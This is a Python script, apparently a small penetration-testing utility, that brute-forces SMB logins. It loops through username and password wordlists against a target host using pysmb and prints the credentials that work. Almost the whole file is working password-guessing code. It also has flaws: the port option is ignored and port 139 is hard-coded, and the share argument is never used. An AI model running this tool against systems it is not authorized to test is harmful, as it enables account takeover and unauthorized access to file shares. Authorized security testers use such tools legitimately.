import argparse
from smb.SMBConnection import SMBConnection

def fuzz_smb(user, password, target,share, port,userfile=None, passfile=None):
    my_name = "user"
    remote_name = "remote user"

    print('\nFuzzing SMB with user: {}, password: {}, target: {}, port: {}\n'.format(user, password, target, port))
    
    if passfile and user:
        with open(passfile, 'r') as f:
            passwords = f.readlines()
        for password in passwords:
            password = password.strip()
            conn = SMBConnection(user, password,my_name,remote_name, use_ntlm_v2=True)
            flag = conn.connect(target, 139)
            if flag:
                print(f'\033[92m [+]\033[0m {user} : ', password)
                break
            else:
                print(f'\033[91m [-]\033[0m {user} : ', password)

    elif userfile and password:
        with open(userfile, 'r') as f:
            users = f.readlines()
        for user in users:
            user = user.strip()
            conn = SMBConnection(user, password,my_name,remote_name, use_ntlm_v2=True)
            flag = conn.connect(target, 139)
            if flag:
                print(f'\033[92m [+]\033[0m {user} : ', password)
                break
            else:
                print(f'\033[91m [-]\033[0m {user} : ', password)
            

    elif userfile and passfile:
        with open(userfile, 'r') as f:
            users = f.readlines()
        with open(passfile, 'r') as f:
            passwords = f.readlines()
        for user in users:
            user = user.strip()
            for password in passwords:
                password = password.strip()

                conn = SMBConnection(user, password,my_name,remote_name, use_ntlm_v2=True)
                flag = conn.connect(target, 139)
                if flag:
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break
                else:
                    print(f'\033[91m [-]\033[0m {user} : ', password)


    else:
        print('\033[91m [-]\033[0m Please provide both username and password files')
        exit(1)
        

def main():
    parser = argparse.ArgumentParser(description="Fuzz SMB")
    parser.add_argument('-port', default=445, type=int, help='Port')
    parser.add_argument('-T','--target',type=str, help='Target')
    parser.add_argument('-s','--share',type=str,help='Nmae of SMB Share')

    group_pass = parser.add_mutually_exclusive_group(required=True)
    group_pass.add_argument('-p','--password',type=str, help='Password')
    group_pass.add_argument('-P','--passwordfile',type=argparse.FileType('r'), help='Password file')

    group_user = parser.add_mutually_exclusive_group(required=True)
    group_user.add_argument('-u', '--user', type=str, help='Username')
    group_user.add_argument('-U', '--userfile', type=argparse.FileType('r'), help='User file')
    
    args = parser.parse_args()
    if args.userfile:
        userfile = args.userfile.name
    else:
        userfile = None

    if args.passwordfile:
        passwordfile = args.passwordfile.name
    else:
        passwordfile = None

    fuzz_smb(args.user, args.password, args.target, args.share, args.port, userfile, passwordfile)


if __name__ == '__main__':
    main()